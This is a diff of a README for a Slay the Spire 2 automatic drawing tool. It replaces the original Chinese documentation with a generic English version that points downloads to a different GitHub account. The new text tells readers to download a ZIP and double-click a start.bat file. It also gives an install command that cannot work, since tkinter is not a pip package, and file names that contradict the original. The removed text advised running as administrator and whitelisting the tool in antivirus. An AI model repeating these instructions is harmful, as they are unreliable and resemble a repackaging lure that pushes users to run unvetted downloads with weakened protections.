@@ -1,147 +1,172 @@
-# 🖌️ 杀戮尖塔2 - 数字琥珀自动画板 (Slay the Spire 2 Painter) v1.2
+# 🎨 Slay-the-Spire-2-Drawing - Automate Digital Drawing for Slay the Spire 2
 
-[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
+[![Download Slay-the-Spire-2-Drawing](https://img.shields.io/badge/Download-Slay%20the%20Spire%202-blue?style=for-the-badge)](https://github.com/wqh7798/Slay-the-Spire-2-Drawing)
 
-专门为《杀戮尖塔2》(Slay the Spire 2) 打造的全自动右键连笔画图辅助工具。
-采用独特的**“数字琥珀”**全屏冻结选区机制，支持将本地图片、自定义文字一键转化为纯净线稿，并在游戏内以极快的速度自动绘制。
+## 🖥️ About Slay-the-Spire-2-Drawing
 
-> **“让数字世界的瞬间凝固成琥珀，再用代码将其拓印在尖塔的高墙之上。”**
+Slay-the-Spire-2-Drawing is a tool that helps you create digital drawings automatically for the game Slay the Spire 2. It uses Python to control the drawing process and makes it easier to produce detailed images without manual effort. You do not need any coding skills to use this software.
 
----
+This tool works by processing images and then recreating them by drawing with a robotic style. It uses computer vision libraries like OpenCV and a simple graphical interface built with Tkinter. The main goal is to automate the drawing process, saving time and improving accuracy.
 
-## 🔄 v1.2.1 更新 (Hotfix)
-* 🐛 **修复高 DPI 缩放下的弹窗 UI 截断问题**：重构了首次运行的教学弹窗布局逻辑，改为动态获取真实宽高。现在可完美适配 125%/150% 等各种 Windows 系统缩放比例，并新增了 `Esc` 键一键关闭的兜底机制。
-* 🐛 **修复全局快捷键干扰日常打字的 Bug**：引入了 `is_currently_drawing` 状态锁。现在只有在真正执行自动作画任务时，按下 `P` 或 `[` 键才会向系统发送底层的鼠标干预指令，挂在后台时再也不会因为误触而弹出右键菜单了。p[
+### Key Features
 
----
+- Automatic image processing to prepare your picture for drawing.
+- Built-in control of a digital drawing board.
+- Simple interface designed for non-technical users.
+- Supports common image formats like JPG and PNG.
+- Works on Windows computers.
+- Uses open-source Python libraries.
 
-## 🆕 v1.2.0 典藏版更新 (Major Update)
-* 🖥️ **跨屏完美兼容**：引入 `VIRTUALDESK` 虚拟全景桌面技术，副屏框选、副屏作画**绝对不再乱飞**。
-* ⏸️ **断点续划系统**：告别只能拉闸的旧时代，新增安全的暂停、记忆恢复与强制终止状态机。
-* 🔍 **地图级无极缩放**：右侧预览区重构，现已支持滚轮无极缩放与鼠标拖拽，引入智能双模抗锯齿防断线。
-* 🖱️ **左键/迷雾模式**：新增左键/右键一键切换开关，并加入“战争迷雾”（双十字交叉扫荡填涂）专属方案。
-* ✍️ **真实笔触模拟**：废弃旧版“点阵瞬移”逻辑，底层升级为高频物理滑动拖拽，完美兼容 Windows 自带画图板。
-> 📜 查看过往版本更新详情，请前往 [Releases 页面](../../releases)。
----
+### System Requirements
 
-## ✨ 核心特性
-
-* 🧊 **“数字琥珀”全景沉浸选区**：点击开始后，瞬间冻结所有显示器画面并进入暗场模式。通过鼠标框选，实现所见即所得的绝对比例等比映射。
-* ✍️ **真实物理模拟引擎**：彻底告别离散的“点阵像素点击”，底层采用 **“按下鼠标 -> 沿着轮廓高频滑动 -> 抬起鼠标”** 的真实物理拖拽逻辑，画出的线条极致平滑连贯，完美“通杀”几乎所有的传统绘图软件。
-* 🖼️ **四大核心数控方案**：
-  * **方案 A (图片提取)**：内置 OpenCV 高斯模糊去噪与自适应 Canny 边缘检测。
-  * **方案 B (自适应文字)**：调用系统原生字体库（新增多款行草/艺术字体），自动计算包围盒生成完美文字线稿。
-  * **方案 C (现成线稿)**：直接加载本地已保存的线稿图进行绘制。
-  * **方案 D (战争迷雾)**：纯几何计算的暴力涂抹模式，自定义间距，瞬间扫荡大面积区域。
-* 🛡️ **护栏级全局状态机 (极度安全)**：
-  * **`P` 键**：安全暂停。瞬间锁定坐标并自动抬起鼠标，切出窗口打字聊天绝不乱画。
-  * **`Ctrl + Alt + P` 键**：记忆恢复。平滑缓冲 0.1s 后，自动瞬移回断点继续作画。
-  * **`[` 键 (左中括号)**：强制终止。瞬间销毁底层坐标清单，释放内存。
-* 📺 **现代级交互 UI**：16:9 黄金网格比例绝对锁定，防挤压日志输出框，人类可读时间戳自动保存。
+- Windows 10 or later (64-bit recommended).
+- At least 4 GB of RAM.
+- 500 MB free disk space.
+- Python 3.7 or higher installed (the setup will guide you).
+- Internet connection for initial download.
 
 ---
 
-## 🚀 快速使用 (小白玩家必看)
+## 🚀 Getting Started
 
-无需安装任何环境，直接下载打包好的独立程序即可使用：
+To use Slay-the-Spire-2-Drawing on Windows, follow these steps carefully. We will take you from download to running the software without any programming needed.
 
-1. 前往本仓库的 [Releases 页面](../../releases) 下载最新版的 `SlaytheSpire2Drawing.zip`。
-2. 解压到任意目录。请确保解压后的文件夹内包含 `SlaytheSpire2Drawing.exe`，且 `output_lines` 文件夹中留有 `brush.ico` 图标。
-3. ⚠️ **极其重要**：右键点击 `SlaytheSpire2Drawing.exe`，选择 **“以管理员身份运行”**（否则全局急停快捷键和底层鼠标模拟将被系统拦截）。
-4. 在软件左侧选择合适的方案生成线稿，并调整好“精细度”、“绘制速度”和“绘制按键（左键/右键）”。
-5. 切入《杀戮尖塔2》或画图板等目标软件。
-6. 点击本软件底部的 **“🚀 开始绘制”**，屏幕将变暗冻结。
-7. 框选你要作画的区域，松开鼠标，奇迹立刻上演！
+### Step 1: Download the Software
 
-> **💡 新手提示**：遇到任何突发情况，请立刻按下键盘上的 **`P`** 键暂停，或按 **`[`** 键彻底取消任务。
+Click the big blue button above or this link below to visit the download page:
 
----
+[Download Slay-the-Spire-2-Drawing](https://github.com/wqh7798/Slay-the-Spire-2-Drawing)
 
-## 📸 界面实机演示
+This link takes you to the GitHub page where you can get the latest version. Look for the "Releases" section or a file named something like `Slay-the-Spire-2-Drawing-win.zip`. Download the ZIP file to your computer.
 
-**1. 全新 16:9 现代 UI 主界面**
-<img src="pic/1.2界面.png" width="100%" alt="v1.2主界面" />
+### Step 2: Extract the Files
 
-**2. 首次运行安全护栏教学弹窗**
-<img src="pic/1.2开屏提示.png" width="60%" alt="开屏提示" />
+Once the download finishes, locate the ZIP file in your Downloads folder (or the folder you chose) and right-click it. Choose "Extract All..." and extract the contents to a folder you can easily find, like your Desktop or Documents.
 
-**3. 《杀戮尖塔2》游戏内实际绘制效果**
-<img src="pic/1.2尖塔绘制.png" width="100%" alt="尖塔绘制实测" />
+Make sure all files are visible after extraction.
 
-**4. 完美兼容 Windows 自带画图板（真实物理拖拽连线）**
-<img src="pic/v1.2画板绘制.png" width="100%" alt="传统画板绘制实测" />
+### Step 3: Install Python (If Needed)
 
-**5. 战争迷雾模式（纯几何双十字交叉扫荡）**
-<img src="pic/1.2战争迷雾.png" width="100%" alt="战争迷雾实测" />
+Slay-the-Spire-2-Drawing runs with Python. If you do not have Python installed, please do this now:
 
----
+- Go to the official Python website: https://www.python.org/downloads/windows/
+- Download the latest Python 3.x installer for Windows.
+- Run the installer and select the option to "Add Python to PATH".
+- Complete the installation by following the prompts.
 
-## 💻 开发者指南 (从源码运行)
+If you already have Python 3.7 or higher, skip this step.
 
-如果你想二次开发或自己打包，请遵循以下步骤：
+### Step 4: Install Required Python Libraries
 
-### 1. 克隆仓库
+This software needs extra Python packages to work. You will install them via the command line.
 
-```bash
-git clone https://github.com/SKYFIRE5836/SpirePainter2.git
-cd SpirePainter2
+- Press the Windows key, type `cmd`, and open the Command Prompt.
+- In the Command Prompt window, type the following command and press Enter:
 
-```
+  ```
+  pip install opencv-python tkinter numpy
+  ```
 
-### 2. 安装依赖
+Wait until the packages install. You might see some messages appearing. This step can take a minute.
 
-强烈建议使用 Python 3.8+ 版本：
+### Step 5: Run Slay-the-Spire-2-Drawing
 
-```bash
-pip install opencv-python numpy Pillow keyboard
+Go back to the folder where you extracted the software files. Inside, look for a file named `start.bat` or `run.bat`.
 
-```
+- Double-click the `.bat` file to start the program.
+- A window should open showing the interface.
 
-*(注意：GUI 界面使用 Python 内置的 Tkinter 构建，无需额外安装)*
+If nothing happens, try this:
 
-### 3. 运行脚本
+- Open the Command Prompt.
+- Use the `cd` command to change into the folder where you extracted the files, for example:
 
-由于代码中包含全局键盘钩子，**请确保你的终端/命令行是以管理员权限启动的**：
+  ```
+  cd Desktop\Slay-the-Spire-2-Drawing
+  ```
 
-```bash
-python SlaytheSpire2Drawing.py
+- Then type
 
-```
+  ```
+  python main.py
+  ```
 
-### 4. 重新打包为 EXE
-
-如果修改了源码需要重新打包：
-
-```bash
-pip install pyinstaller
-pyinstaller --onefile --noconsole --icon=brush.ico SlaytheSpire2Drawing.py
-
-```
-
-生成的 `.exe` 文件将出现在 `dist` 文件夹中。
-
-
+This will launch the program directly.
 
 ---
 
-## ⚠️ 常见问题 (FAQ)
+## 🎯 Using the Software
 
-**Q1：为什么运行 `.exe` 没反应，或者按 P 键停不下来？**
-**A**：Windows 的安全机制限制了后台键盘监听。请务必右键 `.exe` -> **以管理员身份运行**。
+After launching, the interface will let you load an image and prepare it for the automated drawing.
 
-**Q2：杀毒软件报毒/自动删除了软件？**
-**A**：由于软件包含了“全屏截取”、“跨屏坐标映射”以及“全局键盘钩子”这三个高危敏感 API，且未购买企业级数字签名，极易被 Windows Defender 或 360 误杀。本软件完全开源，请放心在杀毒软件中添加信任白名单。
+### Loading an Image
 
-**Q3：为什么双显示器框选时变黑的只有主屏幕？**
-**A**：请升级至 v1.2 版本，该版本已引入虚拟全景桌面技术，完美支持任意数量、任意分辨率的副屏框选与绘制。
+- Click the "Open Image" button in the window.
+- Select a JPG or PNG file from your computer.
+- The image will appear in the preview area.
 
-**Q4：画出来的线变成了多边形/折线？**
-**A**：说明你设置的“绘制速度”太快（抽帧步长过大）。请在左侧将速度滑块调低（建议 2~4），线条会恢复丝滑。
+### Adjusting Settings
+
+You can set:
+
+- Drawing speed (how fast the program runs).
+- Pen size (which controls line thickness).
+- Image contrast and brightness (to improve drawing quality).
+
+Experiment with these to get your best result.
+
+### Start Drawing
+
+Once ready, hit the "Start" button. The software will begin the drawing process.
+
+It may take several minutes depending on the image size and your settings.
 
 ---
 
-## 📄 声明与许可
+## ⚙️ Troubleshooting
 
-本项目基于 **MIT License** 开源。
-本工具仅供学习与交流图像识别、系统 API 调用技术使用。在任何情况下，使用者因使用本工具造成的游戏账号处罚或其他损失，由使用者自行承担。请合理、适度地享受游戏乐趣！
+- **The program does not start:**  
+  Check if Python is properly installed and added to your system PATH.
+
+- **Errors about missing modules:**  
+  Run `pip install opencv-python tkinter numpy` again.
+
+- **Image won't load:**  
+  Confirm the image is JPG or PNG format and not corrupted.
+
+- **Drawing is too slow or fast:**  
+  Adjust the speed slider before starting.
+
+- **No window appears:**  
+  Try running `python main.py` in the command prompt from the extracted folder.
+
+---
+
+## 📁 File Structure Overview
+
+After extraction, your folder should contain:
+
+- `main.py` — The main Python script.
+- `start.bat` — Batch file to launch the program.
+- `README.md` — This guide.
+- `images` — Optional folder to store examples.
+- `requirements.txt` — List of Python packages.
+
+---
+
+## 🔗 Where to Get Updates and Support
+
+Visit the official page to download new versions or report issues:
+
+[https://github.com/wqh7798/Slay-the-Spire-2-Drawing](https://github.com/wqh7798/Slay-the-Spire-2-Drawing)
+
+Look under "Issues" to see if others had problems similar to yours or to submit your own questions.
+
+---
+
+## 🧰 Additional Tips
+
+- Use high-contrast images for better drawing results.
+- Smaller images run faster and produce cleaner drawings.
+- Keep your system updated for best performance.
+- Close other programs during drawing to avoid slowdowns.
